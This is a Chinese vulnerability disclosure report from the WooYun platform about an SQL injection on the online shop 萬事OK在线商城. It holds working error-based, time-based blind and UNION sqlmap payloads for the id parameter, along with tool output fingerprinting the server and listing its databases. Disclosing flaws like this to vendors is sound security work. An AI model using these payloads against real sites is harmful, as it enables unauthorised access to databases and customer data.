wybug_detail: 漏洞详情 披露状态：   									2015-12-09：	细节已通知厂商并且等待厂商处理中									2015-12-14：	厂商已经确认，细节仅向厂商公开									2015-12-24：	细节向核心白帽子及相关领域专家公开									2016-01-03：	细节向普通白帽子公开									2016-01-13：	细节向实习白帽子公开									2016-01-25：	细节向公众公开  简要描述： 萬事OK在线商城sql注射 详细说明：  萬事OK在线商城sql注射注射链接：http://**.**.**.**/festival.php?id=注射参数：Parameter: id (GET)    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: id=' AND (SELECT 9087 FROM(SELECT COUNT(*),CONCAT(0x7170626a71,(SELECT (ELT(9087=9087,1))),0x7162716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'POhn'='POhn   漏洞证明：  ---Parameter: id (GET)    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: id=' AND (SELECT 9087 FROM(SELECT COUNT(*),CONCAT(0x7170626a71,(SELECT (ELT(9087=9087,1))),0x7162716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'POhn'='POhn    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 OR time-based blind    Payload: id=' OR SLEEP(5) AND 'Xudg'='Xudg    Type: UNION query    Title: Generic UNION query (NULL) - 14 columns    Payload: id=' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170626a71,0x78617842634a616b6b6b,0x7162716b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ---[12:05:55] [INFO] the back-end DBMS is MySQLweb server operating system: Linux CentOS 4.9web application technology: Apache 2.0.52, PHP 5.1.6back-end DBMS: MySQL 5.0[12:05:55] [INFO] fetching database names[12:05:58] [INFO] the SQL query used returns 2 entries[12:06:00] [INFO] retrieved: information_schema[12:06:02] [INFO] retrieved: onceokavailable databases [2]:                                                                                                              [*] information_schema[*] onceok   修复方案：  参数过滤   版权声明：转载请注明来源 路人甲@乌云
